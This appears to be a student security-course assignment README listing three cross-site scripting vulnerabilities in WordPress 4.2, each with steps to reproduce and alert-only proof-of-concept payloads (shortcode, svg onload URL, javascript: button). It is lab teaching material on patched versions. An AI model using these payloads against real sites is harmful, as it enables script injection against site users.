# CS4984
# CS4984 - Wordpress vs Kali - Week 7 Assignment
Time spent: 10 hours total
README.md

1.	Authenticated Stored Cross-Site Scripting (XSS)
    Summary:
      *	Vulnerability type: XSS
      *	Tested in version: 4.2
      *	Fixed in version: 4.2.3
      
    GIF Walkthrough:
    
    <img src="https://i.imgur.com/DOIp9H9.gif"/>
  Steps to Reproduce: Create a page/post and add: 
  
  ```html
  <a href="[caption code=">]</a><a title=" onmouseover=alert('test') ">link</a>
  ```
  
  to the body. Make sure to be in the text mode and not visual mode for the body section.

  Reference: https://klikki.fi/adv/wordpress3.html 

2.	Authenticated Cross-Site Scripting (XSS)
    Summary:
      *	Vulnerability type: XSS
      *	Tested in version: 4.2
      *	Fixed in version: 4.2.6
      
  GIF Walkthrough: 
  
  <img src="https://i.imgur.com/ZEgrhCE.gif"/>
  
  Steps to Reproduce: Go to a post and make a comment that says: 
  ```html
  http://www.example.com/wp-admin/customize.php?theme=<svg onload=alert(1)>
  ``` 
  Once you post the comment, a pop up that says “Alert(1)” will show up.

  References: 
  https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87 
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564 

3.	Pulpload Same Origin Method Execution (SOME)
    Summary: 
      *	Vulnerability type: XSS
      *	Tested in version: 4.2
      *	Fixed in version: 4.2.8
    
      GIF Walkthrough:
      
      <img src="https://i.imgur.com/UB8t0rF.gif"/>
      
      
      Steps to Reproduce: Go to any post and make a comment with the following code: 
      ```html
      <button onclick="fire()">Click</button>
      <script>
      function fire() {
      open('javascript:alert(1)');
      }
      </script>
      ```
      Post the comment and click on the button in the comment. A pop up that says “Alert(1) will show up.

      References: 
      https://wpvulndb.com/vulnerabilities/8489 
      https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e 
